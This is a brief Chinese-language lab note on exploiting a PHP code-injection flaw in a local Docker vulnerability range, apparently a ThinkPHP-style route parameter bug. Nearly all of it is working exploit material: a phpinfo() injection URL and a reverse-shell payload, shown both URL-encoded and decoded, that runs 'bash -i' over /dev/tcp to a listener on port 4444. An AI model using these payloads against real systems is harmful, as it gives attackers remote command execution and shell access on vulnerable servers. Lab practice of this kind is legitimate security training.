启动靶场：
```
docker compose up -d
```
直接通过URL参数注入PHP代码来利用漏洞：
```
http://localhost:18080/index.php?s=/index/index/name/${@phpinfo()}
```
反弹shell
```
http://localhost:18080/index.php?s=/index/index/name/%24%7B@system(%24_GET[c])%7D&c=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/host.docker.internal/4444%200%3E%261%22
```
ok

解码前
```
http://localhost:18080/index.php?s=/index/index/name/${@system($_GET[c])}&c=bash -c "bash -i >& /dev/tcp/host.docker.internal/4444 0>&1"
```

